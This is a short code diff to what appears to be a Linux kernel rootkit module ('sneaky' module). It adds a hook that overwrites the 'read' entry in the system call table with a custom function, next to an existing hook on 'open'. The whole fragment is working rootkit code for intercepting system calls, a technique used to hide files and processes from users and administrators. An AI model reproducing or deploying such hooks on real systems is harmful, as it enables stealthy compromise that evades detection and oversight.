@@ -168,6 +168,12 @@ static int initialize_sneaky_module(void) {
   original_call = (void *)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
+  // Save away the original 'read' system call.
+  // Then overwrite its address in the system call
+  // table with the function address of our new code.
+  original_read = (void *)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
